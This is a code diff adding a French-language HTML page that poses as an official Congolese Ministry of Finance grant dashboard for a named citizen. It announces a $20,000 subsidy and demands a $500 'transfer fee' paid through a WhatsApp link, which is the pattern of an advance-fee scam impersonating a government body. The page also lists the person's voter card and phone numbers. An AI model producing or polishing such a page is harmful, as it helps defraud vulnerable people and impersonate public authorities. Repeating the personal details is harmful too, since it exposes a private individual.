@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tableau de Bord - Programme Impulsion</title>
+    <style>
+        :root { --primary: #007FFF; --success: #25D366; --warning: #f1c40f; --danger: #e74c3c; --dark: #2c3e50; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f7f6; margin: 0; color: var(--dark); }
+        
+        /* Layout */
+        .sidebar { width: 260px; background: var(--dark); color: white; height: 100vh; position: fixed; padding: 20px; box-sizing: border-box; }
+        .main { margin-left: 260px; padding: 30px; }
+        
+        /* Header */
+        .header { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 25px; display: flex; justify-content: space-between; align-items: center; }
+        .status { padding: 8px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; background: var(--warning); color: #856404; }
+
+        /* Grille d'infos */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 25px; }
+        .card { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border-top: 4px solid var(--primary); }
+        .card h3 { margin: 0 0 15px 0; font-size: 14px; text-transform: uppercase; color: #7f8c8d; }
+        
+        /* Section Paiement */
+        .payment-box { background: #fff3f3; border: 2px dashed var(--danger); padding: 25px; border-radius: 12px; text-align: center; }
+        .amount-big { font-size: 32px; font-weight: 800; color: var(--danger); display: block; margin: 10px 0; }
+        
+        .btn-pay { background: var(--success); color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 15px; }
+        
+        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; }
+        .label { font-weight: 600; color: #555; }
+    </style>
+</head>
+<body>
+
+<div class="sidebar">
+    <h2>REPUBLIQUE DÉMOCRATIQUE DU CONGO</h2>
+    <hr style="border: 0.5px solid #455a64;">
+    <p>🏠 Tableau de bord</p>
+    <p>📄 Mon Dossier</p>
+    <p>⚙️ Paramètres</p>
+</div>
+
+<div class="main">
+    <div class="header">
+        <div>
+            <h1 style="margin:0;">Espace de : CHRIS KIMBENGI BETUEYI</h1>
+            <small>ID Dossier : 45172/AC-2024</small>
+        </div>
+        <span class="status">⚠️ ATTENTE DE FRAIS</span>
+    </div>
+
+    <div class="grid">
+        <!-- Infos Personnelles -->
+        <div class="card">
+            <h3>Informations du Citoyen</h3>
+            <div class="info-row"><span class="label">Sexe :</span> <span>Masculin</span></div>
+            <div class="info-row"><span class="label">État Civil :</span> <span>Célibataire</span></div>
+            <div class="info-row"><span class="label">Ville :</span> <span>Kinshasa</span></div>
+            <div class="info-row"><span class="label">Carte d'électeur :</span> <span>30401542451</span></div>
+            <div class="info-row"><span class="label">WhatsApp :</span> <span>+243971246766</span></div>
+        </div>
+
+        <!-- Infos Projet -->
+        <div class="card">
+            <h3>Détails de la Subvention</h3>
+            <div class="info-row"><span class="label">Secteur :</span> <span>Agroalimentaire</span></div>
+            <div class="info-row"><span class="label">Montant Alloué :</span> <span style="color:var(--primary); font-weight:bold;">20.000 $ USD</span></div>
+            <p style="font-size: 13px; color: #666; margin-top: 15px;">
+                Objectif : Transformation de produits agricoles locaux et lutte contre la famine en RDC.
+            </p>
+        </div>
+    </div>
+
+    <!-- Section Frais de Transfert -->
+    <div class="payment-box">
+        <h2 style="margin:0; color: var(--danger);">ACTION REQUISE : FRAIS DE TRANSFERT</h2>
+        <p>Pour finaliser le déblocage de votre subvention de 20.000 $, vous devez verser les frais de transaction obligatoires :</p>
+        <span class="amount-big">500,00 $ USD</span>
+        <p style="font-size: 14px; color: #555;">Ces frais couvrent les taxes administratives et les frais de transfert bancaire international.</p>
+        
+        <a href="https://wa.me" class="btn-pay">PAYER LES FRAIS VIA WHATSAPP</a>
+    </div>
+
+    <p style="text-align:center; font-size: 12px; color: #999; margin-top: 40px;">
+        © 2024 Ministère des Finances - RDC | Programme de Soutien à l'Entrepreneuriat
+    </p>
+</div>
+
+</body>
+</html>
